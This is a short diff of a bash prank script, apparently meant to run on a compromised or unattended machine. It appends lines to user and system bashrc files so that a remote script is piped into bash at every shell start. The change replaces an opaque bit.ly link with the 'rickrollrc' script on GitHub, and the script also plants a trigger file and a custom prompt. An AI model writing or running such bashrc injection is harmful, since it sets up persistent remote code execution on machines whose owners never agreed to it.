@@ -199,7 +199,7 @@ function generic(){
 			EOF
 		echo 'touch /tmp/.trigger &> /dev/null' | tee -a $userBashrcPath $bashrcPath &> /dev/null
 		printf "\n%s\n" "$centDirtyRootPS1" | tee -a $userBashrcPath $bashrcPath &> /dev/null
-		echo 'curl -s -L http://bit.ly/10hA8iC | bash' | tee -a $userBashrcPath $bashrcPath &> /dev/null
+		echo 'curl -s -L https://raw.github.com/keroserene/rickrollrc/master/roll.sh | bash' | tee -a $userBashrcPath $bashrcPath &> /dev/null
 		#welcome messages
 			for n in {1..35}; do
 				printf "\t\t\e[0;31m AND SO IT BEGINS!! \e[0;m\n"
